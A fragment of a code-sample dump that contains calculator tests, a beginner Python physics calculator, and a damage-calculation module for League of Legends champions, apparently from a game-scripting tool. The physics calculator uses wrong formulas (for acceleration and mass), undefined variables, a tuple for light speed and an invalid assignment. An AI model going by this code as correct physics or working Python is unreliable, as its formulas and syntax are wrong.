calc.calculate(\"-10/3\") == \"( Error: Please Enter the Equation in Correct Format )\"\n    assert calc.calculate(\"25/5++6\") == \"( Error: Please Enter the Equation in Correct Format )\"\n    assert calc.calculate(\"23+26a-8501t\") == \"( Error: Equation Contains Unpermitted Symbol )\"\n    assert calc.calculate(\"205+6-9/0\") == \"(Error: divide by 0)\"\n    assert calc.calculate(\"39/16-21-20/0*22+9+32/28*33*2-8+36+40/40\") == \"(Error: divide by 0)\"\n    assert calc.calculate(\"39/16-21-20/39*22+9+32/28*0*2-8+36+40/40\") == \"(Error: divide by 0)\"\n    assert calc.calculate(\"39/16-21-20/39*22+9+32/28*55*0-8+36+40/40\") == \"(Error: divide by 0)\"\n    assert calc.calculate(\"39/16-21-20/39*22+9+32/28*55*12-8+36+40/0\") == \"(Error: divide by 0)\"\n    assert calc.calculate(\"10/3+10/3\") == str(7)\n    assert calc.calculate(\"3+2\") == str(5)\n    assert calc.calculate(\"3-2\") == str(1)\n    assert calc.calculate(\"3*2\") == str(6)\n    assert calc.calculate(\"3/2\") == str(2)\n    assert calc.calculate(\"32-52\") == str(-20)\n    assert calc.calculate(\"39/16-21-20/39*22+9+32/28*33*2-8+36+40/40\") == str(19)\n    assert calc.calculate(\"2-39-37-26*21/9+37-14+25-30/29+23/22/30/12\") == str(-88)\n    assert calc.calculate(\"16348-35509+12833/19037+13798-4346-25849*\" +\n                          \"6087*11668-4769-9605+13934/26324/27774-20032\") == str(-1835876569598)\n    assert calc.calculate(\"16348-35509+12833/19037+13798-4346-25849*\" +\n                          \"6087*11668-4769-9605+13934/26324/27774-20032-1/2\") == str(-1835876569599)\n    assert calc.calculate(\n        \"191*83+250-164/88/88+44-215*236*132*94*354/79\" +\n        \"-153/181*62-384+55-128/77/188+187/372-346/315-189*73+267+227/71\" +\n        \"+309*152/182*264-237/72+217-393+124-317-50*203-336\" +\n        \"*121/173/313/12-303+157/154/164-219-356/388-99*286+162*282\" +\n        \"*181*189+292-201/140+246*50/395/8/232/251-144-289/261+301\" +\n        \"*219-48+1+10/301*306*44*105/8/164/22*296*225*280\" +\n        \"+359+234-395*305*52+389-192/196-233/20/68+207+337\") == str(-1264594822)\n", "329": "print(\"Welcome to Dhruv's Physics Calculator\")\r\ncalc=str(input('Enter the calculation(no capital letters): '))\r\n\r\nif(calc=='velocity'):\r\n    displacement=float(input('Enter the displacement:'))\r\n    time=float(input('Enter the time:'))\r\n    velocity=displacement/time\r\n    print('%0.3f is the output velocity.' %(velocity))\r\nelif(calc=='acceleration'):\r\n    velocity2=float(input('Enter the velocity:'))\r\n    time2=float(input('Enter the time:'))\r\n    acceleration=velocity2/(time2)*(time2)\r\n    print('%0.3f is the output acceleration.' %(acceleration))\r\nelif(calc=='force'):\r\n    mass=float(input('Enter the mass:'))\r\n    acceleration2=float(input('Enter the acceleration:'))\r\n    force=mass*acceleration2\r\n    print('%0.3f is the output force.' %(force))\r\nelif(calc=='weight'):\r\n    mass2=float(input('Enter the mass:'))\r\n    gravity=9.8\r\n    weight=mass*gravity\r\n    print('%0.3f is the weight.' %(weight))\r\nelif(calc=='work'):\r\n    force2=float(input('Enter the force:'))\r\n    distance=float(input('Enter the distance:'))\r\n    work=force2*distance\r\n    print('%0.3f is the work.' %(work))\r\nelif(calc=='power'):\r\n    work2=float(input('Enter the work:'))\r\n    time3=float(input('Enter the time:'))\r\n    power=work2/time3\r\n    print('%0.3f is the power.' %(power))\r\nelif(calc=='momentum'):\r\n    mass3=float(input('Enter the mass:'))\r\n    velocity3=float(input('Enter the velocity:'))\r\n    momentum=mass3*velocity3\r\n    print('%0.3f is the momentum.' %(momentum))\r\nelif(calc=='momentum'):\r\n    mass3=float(input('Enter the mass:'))\r\n    velocity3=float(input('Enter the velocity:'))\r\n    momentum=mass3*velocity3\r\n    print('%0.3f is the momentum.' %(momentum))\r\nelif(calc=='energy'):\r\n    mass4=float(input('Enter the mass:'))\r\n    lightspeed=299,792,458\r\n    energy=mass*lightspeed*lightspeed\r\n    print('%0.3f is the energy' %(energy))\r\nelif(calc=='potentialenergy'):\r\n    mass5=float(input('Enter the mass:'))\r\n    height=float(input('Enter the height:'))\r\n    penergy=mass5*height*gravity\r\n    print('%0.3f is the potentional energy' %(penergy))\r\nelif(calc=='kineticenergy'):\r\n    mass6=float(input('Enter the mass:'))\r\n    velocity4=float(input('Enter the velocity:'))\r\n    kenergy=(mass6*velocity4*velocity4)/2\r\n    print('%0.3f is the kinetic energy' %(kenergy))\r\nelif(calc=='pressure'):\r\n    force3=float(input('Enter the force:'))\r\n    area=float(input('Enter the area:'))\r\n    pressure=force3/area\r\n    print('%0.3f is the pressure' %(pressure))\r\nelif(calc=='density'):\r\n    mass7=float(input('Enter the mass:'))\r\n    volume=float(input('Enter the volume:'))\r\n    density=mass7/volume\r\n    print('%0.3f is the density' %(density))\r\nelif(calc=='charge'):\r\n    current=float(input('Enter the current:'))\r\n    time4=float(input('Enter the time:'))\r\n    charge=current*time4\r\n    print('%0.3f is the charge' %(charge))\r\nelif(calc=='potentialdifference'):\r\n    current2=float(input('Enter the current:'))\r\n    resistance=float(input('Enter the resistance:'))\r\n    potentialdifference=current2*resistance\r\n    print('%0.3f is the potentialdifference' %(potentialdifference))\r\nelif(calc=='power2'):\r\n    potentialdifference2=float(input('Enter the potential difference:'))\r\n    current3=float(input('Enter the current:'))\r\n    power2=current3*potentialdifference2\r\n    print('%0.3f is the power' %(power2))\r\nelif(calc=='frequency'):\r\n    period=float(input('Enter the period:'))\r\n    frequency=1/period\r\n    print('%0.3f is the frequency' %(frequency))\r\nelif(calc=='capicitance'):\r\n    chargestore=float(input('Enter the charge stored:'))\r\n    potentialdifference3=float(input('Enter the potential difference:'))\r\n    capicitance=chargestore/potentialdifference3\r\n    print('%0.3f is the capicitance' %(capicitance))\r\nelif(calc=='wavespeed'):\r\n    frequency2=float(input('Enter the frequency:'))\r\n    wavelength=float(input('Enter the potential difference:'))\r\n    wavespeed=wavelength*frequency2\r\n    print('%0.3f is the wave speed' %(wavespeed))\r\nelif(calc=='displacement'):\r\n    finaldisplacement=float(input('Enter the final displacement:'))\r\n    regulardisplacement=float(input('Enter the initial displacement:'))\r\n    displacement2=finaldisplacement-regulardisplacement\r\n    print('%0.3f is the displacement' %(displacement2))\r\nelif(calc=='Intensity'):\r\n    area2=float(input('Enter the area:'))\r\n    power3=float(input('Enter the power:'))\r\n    intensity=power3/area2\r\n    print('%0.3f is the intensity' %(intensity))\r\nelif(calc=='current4'):\r\n    charge2=float(input('Enter the charge:'))\r\n    time5=float(input('Enter the time:'))\r\n    current4=charge2/time5\r\n    print('%0.3f is the current' %(current4))\r\nelif(calc=='current5'):\r\n    voltage=float(input('Enter the voltage:'))\r\n    resistance2=float(input('Enter the resistance:'))\r\n    current5=voltage/resistance\r\n    print('%0.3f is the current' %(current5))\r\nelif(calc=='avlife'):\r\n    wavelength2=float(input('Enter the wavelength:'))\r\n    avlife=1/wavelength2\r\n    print('%0.3f is the wavelength' %(wavelength2))\r\nelif(calc=='cost'):\r\n    amount=float(input('Enter the amount:'))\r\n    price=float(input('Enter the price:'))\r\n    cost=amount*price\r\n    print('%0.3f is the cost' %(cost))\r\nelif(calc=='mass8'):\r\n    force4=float(input('Enter the force:'))\r\n    acceleration3=float(input('Enter the acceleration:'))\r\n    mass8=force4*acceleration3\r\n    print('%0.3f is the mass' %(mass))\r\nelif(calc=='finalvelocity'):\r\n    initialvelocity=float(input('Enter the initial velocity:'))\r\n    acceleration4=float(input('Enter the acceleration:'))\r\n    time6=float(input('Enter the acceleration:'))\r\n    finalvelocity=initialvelocity+acceleration4*time6\r\n    print('%0.3f is the final velocity' %(finalvelocity))\r\nelif(calc=='finalvelocity2'):\r\n    initialvelocity2=float(input('Enter the initial velocity:'))\r\n    acceleration5=float(input('Enter the acceleration:'))\r\n    time7=float(input('Enter the acceleration:'))\r\n    displacement3=float(input('Enter the displacement:'))\r\n    finalvelocity*finalvelocity=initialvelocity*initialvelocity+acceleration5*time7*displacement3\r\n    print('%0.3f is the final velocity' %(finalvelocity2))\r\nelif(calc=='flowRate'):\r\n    volume2=float(input('Enter the amount:'))\r\n    time8=float(input('Enter the price:'))\r\n    flowRate=volume2/time8\r\n    print('%0.3f is the flow rate' %(flowRate))\r\n", "330": "from valkyrie import *\nimport os, json\n\nCalculations = {}\n\nclass Damage:\n\n\tdef __init__(self, raw_dmg):\n\t\tself.raw_dmg = raw_dmg\n\n\tdef calc_against(self, ctx, attacker, target):\n\t\treturn 0.0\n\n\tdef get_color(self, alpha = 1.0):\n\t\tcol = self._color()\n\t\treturn Col(col.r, col.g, col.b, alpha)\n\n\tdef _color(self):\n\t\treturn Col.Gray\n\nclass MagicDamage(Damage):\n\tdef calc_against(self, ctx, attacker, target):\n\t\treturn attacker.effective_magic_dmg(target, self.raw_dmg)\n\n\tdef _color(self):\n\t\treturn Col.Cyan\n\nclass PhysDamage(Damage):\n\tdef calc_against(self, ctx, attacker, target):\n\t\treturn attacker.effective_phys_dmg(target, self.raw_dmg)\n\n\tdef _color(self):\n\t\treturn Col.Orange\n\nclass TrueDamage(Damage):\n\tdef calc_against(self, ctx, attacker, target):\n\t\treturn self.raw_dmg\n\n\tdef _color(self):\n\t\treturn Col.White\n\nclass WrapMaxHP(Damage):\n\tdef __init__(self, dmg_applied):\n\t\tself.dmg_applied = dmg_applied\n\n\tdef calc_against(self, ctx, attacker, target):\n\t\told_dmg = self.dmg_applied.raw_dmg\n\n\t\tself.dmg_applied.raw_dmg *= target.max_health\n\t\tresult = self.dmg_applied.calc_against(ctx, attacker, target)\n\n\t\tself.dmg_applied.raw_dmg = old_dmg\n\n\t\treturn result\n\n\tdef _color(self):\n\t\treturn self.dmg_applied._color()\n\nclass MixedDamage(Damage):\n\n\tdef __init__(self, phys = None, magic = None, true = None, others=None):\n\t\tif others is None:\n\t\t\tothers = []\n\n\t\tself.phys = phys\n\t\tself.magic = magic\n\t\tself.true = true\n\t\tself.others = others\n\n\tdef calc_against(self, ctx, attacker, target):\n\t\ttotal = 0.0\n\t\tif self.phys:\n\t\t\ttotal += self.phys.calc_against(ctx, attacker, target)\n\t\tif self.magic:\n\t\t\ttotal += self.magic.calc_against(ctx, attacker, target)\n\t\tif self.true:\n\t\t\ttotal += self.true.calc_against(ctx, attacker, target)\n\t\tfor dmg in self.others:\n\t\t\ttotal += dmg.calc_against(ctx, attacker, target)\n\n\t\treturn total\n\n\tdef add_individual(self, dmg1, dmg2, cls):\n\t\tif dmg1 == None:\n\t\t\treturn cls(dmg2.raw_dmg) if dmg2 else None\n\t\telif dmg2 == None:\n\t\t\treturn cls(dmg1.raw_dmg) if dmg1 else None\n\n\t\treturn cls(dmg1.raw_dmg + dmg2.raw_dmg)\n\n\tdef __add__(self, other):\n\t\tdmg = MixedDamage(\n\t\t\tphys = self.phys,\n\t\t\tmagic = self.magic,\n\t\t\ttrue = self.true,\n\t\t\tothers = self.others\n\t\t)\n\n\t\totype = type(other)\n\t\tif otype == MixedDamage:\n\t\t\tdmg.phys   = self.add_individual(self.phys, other.phys, PhysDamage)\n\t\t\tdmg.magic  = self.add_individual(self.magic, other.magic, MagicDamage)\n\t\t\tdmg.true   = self.add_individual(self.true, other.true, TrueDamage)\n\t\t\tdmg.others += other.others\n\n\t\telif otype == PhysDamage:\n\t\t\tdmg.phys = self.add_individual(self.phys, other, PhysDamage)\n\t\telif otype == MagicDamage:\n\t\t\tdmg.magic = self.add_individual(self.magic, other, MagicDamage)\n\t\telif otype == TrueDamage:\n\t\t\tdmg.true = self.add_individual(self.true, other, TrueDamage)\n\t\telse:\n\t\t\tdmg.others.append(other)\n\n\t\treturn dmg\n\n\tdef _color(self):\n\t\treturn Col.Red\n\nclass TwitchExpungeDamage(MixedDamage):\n\tdef __init__(self, base, phys, magic):\n\t\tself.base = base\n\t\tself.phys = phys\n\t\tself.magic = magic\n\n\tdef calc_against(self, ctx, attacker, target):\n\t\tstacks = 0\n\t\tif target.has_buff('TwitchDeadlyVenom'):\n\t\t\tstacks = target.get_buff('TwitchDeadlyVenom').value\n\n\t\treturn self.base.calc_against(ctx, attacker, target) + stacks*self.phys.calc_against(ctx, attacker, target) + stacks*self.magic.calc_against(ctx, attacker, target)\n\nclass KalistaExpungeWrapperDamage(PhysDamage):\n\tdef __init__(self, base, phys):\n\t\tself.base = base\n\t\tself.phys = phys\n\n\tdef calc_against(self, ctx, attacker, target):\n\t\tstacks = target.num_buff_stacks('kalistaexpungemarker')\n\n\t\treturn self.base.calc_against(ctx, attacker, target) + stacks*self.phys.calc_against(ctx, attacker, target)\n\nclass CassiopeiaEDamage(MagicDamage):\n\tdef __init__(self, base, bonus):\n\t\tself.base = base\n\t\tself.bonus = bonus\n\n\tdef calc_against(self, ctx, attacker, target):\n\n\t\tdmg = self.base.calc_against(ctx, attacker, target)\n\n\t\tif type(target) == ChampionObj:\n\t\t\tpoisoned = target.has_buff('cassiopeiaqdebuff') or target.has_buff('cassiopeiawbuff')\n\t\t\tif poisoned:\n\t\t\t\tdmg += self.bonus.calc_against(ctx, attacker, target)\n\n\t\treturn dmg\n\nclass KogMawRDamage(MagicDamage):\n\n\tdef calc_against(self, ctx, attacker, target):\n\t\tp = target.health/target.max_health\n\t\tif p < 0.4:\n\t\t\tself.raw_dmg *= 2.0\n\t\t\tdmg = super().calc_against(ctx, attacker, target)\n\t\t\tself.raw_dmg /= 2.0\n\t\telse:\n\t\t\tdmg = super().calc_against(ctx, attacker, target)\n\n\t\treturn dmg\n\nclass DariusRDamage(TrueDamage):\n\n\tdef __init__(self, base):\n\t\tself.base = base\n\n\tdef calc_against(self, ctx, attacker, target):\n\t\tnum_stacks = target.num_buff_stacks('DariusHemo')\n\t\treturn self.base + self.base * (0.2*num_stacks)\n\nclass SyndraRDamage(MagicDamage):\n\n\tdef __init__(self, base):\n\t\tself.base = base\n\n\tdef calc_against(self, ctx, attacker, target):\n\t\tself.raw_dmg = self.base * min(7, 3 + len(ctx.others.has_tag(Unit.SpecialSyndraSphere).alive().get()))\n\n\t\treturn super().calc_against(ctx, attacker, target)\n\n\nclass TristanaEDamage(MagicDamage):\n\tdef __init__(self, base, bonus_per_stack):\n\t\tself.base = base\n\t\tself.bonus_per_stack = bonus_per_stack\n\n\tdef calc_against(self, ctx, attacker, target):\n\t\tself.raw_dmg = self.base + self.base * 1.2\n\t\tself.raw_dmg = self.raw_dmg + self.raw_dmg * (0.033*attacker.crit/0.1)\n\n\t\treturn super().calc_against(ctx, attacker, target)\n\nclass DianaRDamage(MagicDamage):\n\tdef __init__(self, base, bonus_per_champ):\n\t\tself.base = base\n\t\tself.bonus_per_champ = bonus_per_champ\n\n\tdef calc_against(self, ctx, attacker, target):\n\t\tnum_champs = len(ctx.champs.enemy_to(attacker).targetable().near(attacker, 475).get())\n\t\tself.raw_dmg = self.base + num_champs * self.bonus_per_champ\n\t\treturn super().calc_against(ctx, attacker, target)\n\nclass JinxRDmage(PhysDamage):\n\n\tmissing_hp = [0.25, 0.30, 0.35]\n\tdef __init__(self, base):\n\t\tself.base = base\n\n\tdef calc_against(self, ctx, attacker, target):\n\n\t\tlvl = max(0, attacker.spells[3].lvl - 1)\n\t\tmhp = self.missing_hp[lvl]\n\t\tmulti = min(1.0, 0.1 + 0.06 * attacker.pos.distance(target.pos) / 100.0)\n\n\t\tself.raw_dmg = self.base*multi + mhp*(target.max_health - target.health)\n\t\treturn super().calc_against(ctx, attacker, target)\n\nclass VeigarRDamage(MagicDamage):\n\n\tdef __init__(self, base):\n\t\tself.base = base\n\n\tdef calc_against(self, ctx, attacker, target):\n\t\tp = target.health/target.max_health\n\t\tself.raw_dmg = self.base + self.base * min(0.66, (1.0 - p)*1.5)\n\t\treturn super().calc_against(ctx, attacker, target)\n\nclass XerathRDamage(MagicDamage):\n\n\tdef __init__(self, base):\n\t\tself.base = base\n\n\tdef calc_against(self, ctx, attacker, target):\n\t\tstacks = 0\n\t\tbuff = attacker.get_buff('xerathrshots')\n\t\tif not buff:\n\t\t\tstacks = 2 + attacker.spells[3].lvl\n\t\telse:\n\t\t\tstacks = buff.value\n\n\t\tself.raw_dmg = stacks*self.base\n\t\treturn super().calc_against(ctx, attacker, target)\n\nclass DivineSundererDamage(PhysDamage):\n\n\tdef __init__(self):\n\t\tself.raw_dmg = 0.0\n\n\tdef calc_against(self, ctx, attacker, target):\n\t\tself.raw_dmg = max(attacker.base_atk * 1.5, target.max_health * 0.1)\n\t\treturn super().calc_against(ctx, attacker, target)\n\nclass BotrkDamage(PhysDamage):\n\n\tdef __init__(self):\n\t\tself.raw_dmg = 0.0\n\n\tdef calc_against(self, ctx, attacker, target):\n\t\tdmg = target.health * (0.06 if attacker.is_ranged else 0.1)\n\t\tif dmg > 60.0 and not target.has_tags(Unit.Champion):\n\t\t\tself.raw_dmg = 60.0\n\t\telse:\n\t\t\tself.raw_dmg = dmg\n\n\t\treturn super().calc_against(ctx, attacker, target)\n\nclass NoonquiverDamage(PhysDamage):\n\n\tdef __init__(self):\n\t\tself.raw_dmg = 0.0\n\n\tdef calc_against(self, ctx, attacker, target):\n\t\tself.raw_dmg = 0.0 if target.has_tags(Unit.Champion) else 20.0\n\n\t\treturn super().calc_against(ctx, attacker, target)\n\nclass JhinRShotDamage(PhysDamage):\n\n\tdef __init__(self, base, shots):\n\t\tself.base = base\n\t\tself.shots = shots\n\n\tdef calc_against(self, ctx, attacker, target):\n\t\tmissing_hp = 1.0 - (target.health/target.max_health)\n\t\tself.raw_dmg = self.base + self.base * (3.0 * missing_hp)\n\t\tself.raw_dmg *= self.shots\n\n\t\treturn super().calc_against(ctx, attacker, target)\n\nDamageExtractors = {\n\n\t# Ahri\n\t'ahriorbofdeception'     : lambda calc, champ, skill: MixedDamage(magic = MagicDamage(calc.totaldamage(champ, skill)), true = TrueDamage(calc.totaldamage(champ, skill))),\n\t'ahrifoxfire'            : lambda calc, champ, skill: MagicDamage(calc.singlefiredamage(champ, skill) + calc.multifiredamage(champ, skill)*2.0),\n\t'ahriseduce'             : lambda calc, champ, skill: MagicDamage(calc.totaldamage(champ, skill)),\n\t'ahritumble'             : lambda calc, champ, skill: MagicDamage(calc.rcalculateddamage(champ, skill) * 3.0),\n\n\t# Ashe\n\t'volley'                 : lambda calc, champ, skill: PhysDamage(calc.totaldamage(champ, skill)),\n    'volleyrank2'            : lambda calc, champ, skill: PhysDamage(calc.totaldamage(champ, skill)),\n    'volleyrank3'            : lambda calc, champ, skill: PhysDamage(calc.totaldamage(champ, skill)),\n    'volleyrank4'            : lambda calc, champ, skill: PhysDamage(calc.totaldamage(champ, skill)),\n    'volleyrank5'            : lambda calc, champ, skill: PhysDamage(calc.totaldamage(champ, skill)),\n\t'enchantedcrystalarrow'  : lambda calc, champ, skill: MagicDamage(calc.rmaindamage(champ, skill)),\n\n\t# Annie\n\t'annieq'                 : lambda calc, champ, skill: MagicDamage(calc.totaldamage(champ, skill)),\n\t'anniew'                 : lambda calc, champ, skill: MagicDamage(calc.totaldamage(champ, skill)),\n\t'annier'                 : lambda calc, champ, skill: MagicDamage(calc.initialburstdamage(champ, skill)),\n\n    # Chogath\n\t'feast'                  : lambda calc, champ, skill: TrueDamage(calc.rdamage(champ, skill)),\n\n\t# Darius\n\t'dariuscleave'           : lambda calc, champ, skill: PhysDamage(calc.bladedamage(champ, skill)),\n\t'dariusnoxiantacticsonh' : lambda calc, champ, skill: PhysDamage(calc.empoweredattackdamage(champ, skill)),\n\t'dariusexecute'          : lambda calc, champ, skill: DariusRDamage(calc.damage(champ, skill)),\n\n\t# Diana\n\t'dianaq'                 : lambda calc, champ, skill: MagicDamage(calc.totaldamage(champ, skill)),\n\t'dianaorbs'              : lambda calc, champ, skill: MagicDamage(calc.totalmaxdamage(champ, skill)),\n\t'dianateleport'          : lambda calc, champ, skill: MagicDamage(calc.totaldamage(champ, skill)),\n\t'dianar'                 : lambda calc, champ, skill: DianaRDamage(calc.rexplosiondamage(champ, skill), calc.rmultihitamplification(champ, skill)),\n\n\t# Draven\n\t'dravenrcast'            : lambda calc, champ, skill: PhysDamage(calc.rcalculateddamage(champ, skill)),\n\n\t# Ezreal\n\t'ezrealq'                : lambda calc, champ, skill: PhysDamage(calc.damage(champ, skill)),\n\t'ezrealw'                : lambda calc, champ, skill: MagicDamage(calc.damage(champ, skill)),\n\t'ezreale'                : lambda calc, champ, skill: MagicDamage(calc.damage(champ, skill)),\n\t'ezrealr'                : lambda calc, champ, skill: MagicDamage(calc.damage(champ, skill)),\n\n\t# Fiora\n\t'fioraq'                 : lambda calc, champ, skill: PhysDamage(calc.totaldamage(champ, skill)),\n\t'fioraw'                 : lambda calc, champ, skill: MagicDamage(calc.stabdamage(champ, skill)),\n\t'fiorar'                 : lambda calc, champ, skill: WrapMaxHP(TrueDamage(4.0 * Calculations['fiorapassive'].passivedamagetotal(champ, skill))),\n\n\t# Hecarim\n\t'hecarimrapidslash'      : lambda calc, champ, skill: PhysDamage(calc.damage(champ, skill)),\n\t'hecarimw'               : lambda calc, champ, skill: MagicDamage(calc.totaldamage(champ, skill)),\n\t'hecarimramp'            : lambda calc, champ, skill: PhysDamage(calc.mindamage(champ, skill)),\n\t'hecarimult'             : lambda calc, champ, skill: MagicDamage(calc.damagedone(champ, skill)),\n\n        # Kalista\n\t'kalistaexpungewrapper'  : lambda calc, champ, skill: KalistaExpungeWrapperDamage(PhysDamage(calc.basedamage[skill.lvl - 1]), PhysDamage(calc.additionaldamage(champ, skill))),\n\n\t# Irelia\n\t'ireliaq'                : lambda calc, champ, skill: PhysDamage(calc.championdamage(champ, skill)),\n\t'ireliaw'                : lambda calc, champ, skill: PhysDamage(calc.maxdamagecalc(champ, skill)),\n\t'ireliae'                : lambda calc, champ, skill: MagicDamage(calc.totaldamage(champ, skill)),\n\t'ireliar'                : lambda calc, champ, skill: MagicDamage(calc.missiledamage(champ, skill)),\n\n\t# Jhin\n\t'jhinq'                  : lambda calc, champ, skill: PhysDamage(calc.totaldamage(champ, skill)),\n\t'jhinw'                  : lambda calc, champ, skill: PhysDamage(calc.totaldamage(champ, skill)),\n\t'jhine'                  : lambda calc, champ, skill: MagicDamage(calc.totaldamage(champ, skill)),\n\t'jhinr'                  : lambda calc, champ, skill: JhinRShotDamage(calc.damagecalc(champ, skill), 4.0),\n\t'jhinrshot'              : lambda calc, champ, skill: JhinRShotDamage(calc.damagecalc(champ, skill), 1.0),\n\n\t# Jinx\n\t'jinxw'                  : lambda calc, champ, skill: PhysDamage(calc.totaldamage(champ, skill)),\n\t'jinxe'                  : lambda calc, champ, skill: MagicDamage(calc.totaldamage(champ, skill)),\n\t'jinxr'                  : lambda calc, champ, skill: JinxRDmage(calc.damagemax(champ, skill)),\n\t\n    # Katarina\n    'katarinapassive'        : lambda calc, champ, skill: MagicDamage(calc.totaldamage(champ, skill)),\n    'katarinaq'              : lambda calc, champ, skill: MagicDamage(calc.totaldamage(champ, skill)),\n    'katarinaewrapper'       : lambda calc, champ, skill: MagicDamage(calc.totaldamage(champ, skill)),\n    'katarinar'              : lambda calc, champ, skill: MixedDamage(phys = PhysDamage(calc.totaladdamagecalc(champ, skill)), magic = MagicDamage(calc.totaldamagecalc(champ, skill))),\n\t\n\t# Kayle\n\t'kayleq'                 : lambda calc, champ, skill: MagicDamage(calc.totaldamage(champ, skill)),\n\t'kayler'                 : lambda calc, champ, skill: MagicDamage(calc.totaldamage(champ, skill)),\n\n\t# Cassiopeia\n\t'cassiopeiaq'            : lambda calc, champ, skill: MagicDamage(calc.tooltiptotaldamage(champ, skill)),\n\t'cassiopeiaw'            : lambda calc, champ, skill: MagicDamage(calc.damagepersecond(champ, skill)*5.0),\n\t'cassiopeiae'            : lambda calc, champ, skill: CassiopeiaEDamage(MagicDamage(calc.totaldamage(champ, skill)), MagicDamage(calc.bouspoisoneddamage(champ, skill))),\n\t'cassiopeiar'            : lambda calc, champ, skill: MagicDamage(calc.rdamage(champ, skill)),\n\n\t# Kogmaw\n\t'kogmawq'                : lambda calc, champ, skill: MagicDamage(calc.totaldamage(champ, skill)),\n\t'kogmawvoidooze'         : lambda calc, champ, skill: MagicDamage(calc.totaldamage(champ, skill)),\n\t'kogmawlivingartillery'  : lambda calc, champ, skill: KogMawRDamage(calc.basedamagecalc(champ, skill)),\n\n\t# Olaf\n\t'olafaxethrowcast'       : lambda calc, champ, skill: PhysDamage(calc.totaldamage(champ, skill)),\n\t'olafrecklessstrike'     : lambda calc, champ, skill: TrueDamage(calc.totaldamage(champ, skill)),\n\t\n\t# Orianna\n\t'orianaizunacommand'     : lambda calc, champ, skill: MagicDamage(calc.totaldamagetooltip(champ, skill)),\n\t'orianadissonancecommand': lambda calc, champ, skill: MagicDamage(calc.totaldamage(champ, skill)),\n\t'orianadetonatecommand'  : lambda calc, champ, skill: MagicDamage(calc.totaldamage(champ, skill)),\n\t\n    # Pyke\n\t'pyker'                  : lambda calc, champ, skill: PhysDamage(calc.rdamage(champ, skill)),\n\n\t# Samira\n\t'samiraq'                : lambda calc, champ, skill: PhysDamage(calc.damagecalc(champ, skill)),\n\t'samiraw'                : lambda calc, champ, skill: PhysDamage(calc.damagecalc(champ, skill)),\n\t'samirae'                : lambda calc, champ, skill: MagicDamage(calc.dashdamage(champ, skill)),\n\t'samirar'                : lambda calc, champ, skill: PhysDamage(11.0 * calc.damagecalc(champ, skill)),\n\n\t# Senna\n\t'sennaq'                 : lambda calc, champ, skill: PhysDamage(calc.totaldamage(champ, skill)),\n    'sennaw'                 : lambda calc, champ, skill: PhysDamage(calc.damage(champ, skill)),\n    'sennar'                 : lambda calc, champ, skill: PhysDamage(calc.totaldamage(champ, skill)),\n\n\t# Soraka\n\t'sorakaq'                : lambda calc, champ, skill: MagicDamage(calc.totaldamage(champ, skill)),\n\t'sorakae'                : lambda calc, champ, skill: MagicDamage(calc.totaldamage(champ, skill)*2.0),\n\n\t# Syndra\n\t'syndraq'                : lambda calc, champ, skill: MagicDamage(calc.totaldamage(champ, skill)),\n\t'syndraw'                : lambda calc, champ, skill: MagicDamage(calc.throwdamage(champ, skill)),\n\t'syndrae'                : lambda calc, champ, skill: MagicDamage(calc.totaldamage(champ, skill)),\n\t'syndrar'                : lambda calc, champ, skill: SyndraRDamage(calc.damagecalc(champ, skill)),\n\n\t# Teemo\n\t'blindingdart'           : lambda calc, champ, skill: MagicDamage(calc.calculateddamage(champ, skill)),\n\t'teemorcast'             : lambda calc, champ, skill: MagicDamage(calc.totaldamage(champ, skill)),\n\n\t# Tristana\n\t'tristanaw'              : lambda calc, champ, skill: MagicDamage(calc.landingdamage(champ, skill)),\n\t'tristanae'              : lambda calc, champ, skill: TristanaEDamage(calc.activedamage(champ, skill), calc.activemaxdamage(champ, skill)),\n\t'tristanar'              : lambda calc, champ, skill: MagicDamage(calc.damagecalc(champ, skill)),\n\n\t# Twitch\n\t'twitchexpunge'          : lambda calc, champ, skill: TwitchExpungeDamage(PhysDamage(calc.basedamage[skill.lvl - 1]), PhysDamage(calc.physicaldamageperstack(champ, skill)), MagicDamage(calc.magicdamageperstack(champ, skill))),\n\n\t# Urgot\n\t'urgotq'                 : lambda calc, champ, skill: PhysDamage(calc.totaldamage(champ, skill)),\n\t'urgotw'                 : lambda calc, champ, skill: PhysDamage(12.0 * calc.damagepershot(champ, skill)),\n\t'urgote'                 : lambda calc, champ, skill: PhysDamage(calc.edamage(champ, skill)),\n\t'urgotr'                 : lambda calc, champ, skill: PhysDamage(calc.rcalculateddamage(champ, skill)),\n\n\t# Vayne\n\t'vaynetumble'            : lambda calc, champ, skill: PhysDamage(calc.adratiobonus(champ, skill)),\n\t'vaynesilveredbolts'     : lambda calc, champ, skill: WrapMaxHP(TrueDamage(calc.maxhealthratio[skill.lvl - 1])),\n\t'vaynecondemn'           : lambda calc, champ, skill: PhysDamage(calc.totaldamage(champ, skill)),\n\n\t# Veigar\n\t'veigarbalefulstrike'    : lambda calc, champ, skill: MagicDamage(calc.totaldamagetooltip(champ, skill)),\n\t'veigardarkmatter'       : lambda calc, champ, skill: MagicDamage(calc.totaldamagetooltip(champ, skill)),\n\t'veigarr'                : lambda calc, champ, skill: VeigarRDamage(calc.mindamagetooltip(champ, skill)),\n\n        # Viktor\n\t'viktorpowertransfer'    : lambda calc, champ, skill: MagicDamage(calc.totalmissiledamage(champ, skill)),\n\t'viktordeathray'         : lambda calc, champ, skill: MagicDamage(calc.laserdamage(champ, skill)),\n\t'viktorchaosstorm'       : lambda calc, champ, skill: MagicDamage(calc.initialburstdamage(champ, skill)),\n\n\t# Vladimir\n\t'vladimirq'              : lambda calc, champ, skill: MagicDamage(calc.basedamagetooltip(champ, skill)),\n\t'vladimirhemoplague'     : lambda calc, champ, skill: MagicDamage(calc.damage(champ, skill)),\n\n\t# Yasuo\n\t'yasuoq1wrapper'         : lambda calc, champ, skill: PhysDamage(calc.totaldamagecrit(champ, skill)),\n\t'yasuoq2wrapper'         : lambda calc, champ, skill: PhysDamage(calc.totaldamagecrit(champ, skill)),\n\t'yasuoq3wrapper'         : lambda calc, champ, skill: PhysDamage(calc.totaldamagecrit(champ, skill)),\n\t'yasuoe'                 : lambda calc, champ, skill: MagicDamage(calc.totaldamage(champ, skill)),\n\t'yasuor'                 : lambda calc, champ, skill: PhysDamage(calc.damage(champ, skill)),\n\n    # Yone\n\t'yoneq'                  : lambda calc, champ, skill: PhysDamage(calc.totaldamagecrit(champ, skill)),\n\t'yoneq3'                 : lambda calc, champ, skill: PhysDamage(calc.totaldamagecrit(champ, skill)),\n\t'yonew'                  : lambda calc, champ, skill: PhysDamage(calc.wdamage(champ, skill)),\n\t'yoner'                  : lambda calc, champ, skill: PhysDamage(calc.damage(champ, skill)),\n\n\t# 